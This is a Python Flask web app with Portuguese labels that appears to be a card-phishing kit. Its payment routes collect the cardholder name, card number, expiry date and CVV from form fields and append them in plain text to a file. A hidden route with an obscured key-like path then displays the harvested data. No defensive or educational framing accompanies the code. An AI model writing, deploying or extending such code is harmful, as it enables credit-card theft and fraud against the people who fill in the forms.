from flask import Flask, render_template, request
import requests

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def homepage():
    return render_template('index.html')

@app.route("/cadastro", methods=['GET', 'POST'])
def cadastro():
    return render_template('dados.html')

@app.route("/pagamento", methods=['GET', 'POST'])
def pagamento():
    nome = request.form.get('nometitular')
    sobrenome = request.form.get('sobrenome')
    cartao = request.form.get('cartao')
    validade = request.form.get('validade')
    cvv = request.form.get('cvv')
    arquivo = open('INFOS.txt', 'a+')
    print('Titular:', nome,sobrenome, file=arquivo)
    print('Numero cartão:', cartao, file=arquivo)
    print('Validade:', validade, file=arquivo)
    print('CVV:', cvv,'============================================================================================================================', file=arquivo)

    return render_template('pagamento.html')

@app.route("/processando", methods=['GET', 'POST'])
def processando():
    nome = request.form.get('nometitular')
    sobrenome = request.form.get('sobrenome')
    cartao = request.form.get('cartao')
    validade = request.form.get('validade')
    cvv = request.form.get('cvv')
    arquivo = open('INFOS.txt', 'a+')
    print('Titular:', nome, sobrenome, file=arquivo)
    print('Numero cartão:', cartao, file=arquivo)
    print('Validade:', validade, file=arquivo)
    print('CVV:', cvv,'============================================================================================================================', file=arquivo)

    return render_template('processando.html')

@app.route('/acessokey@6fd8gf52g8fsdfg9g1v5f484f6e9')
def infus():
    with open('INFOS.txt', 'r') as f:
        conteudo = f.read()
    return render_template('infus.html', conteudo=conteudo)

if __name__ == "__main__":
    app.run(debug=True)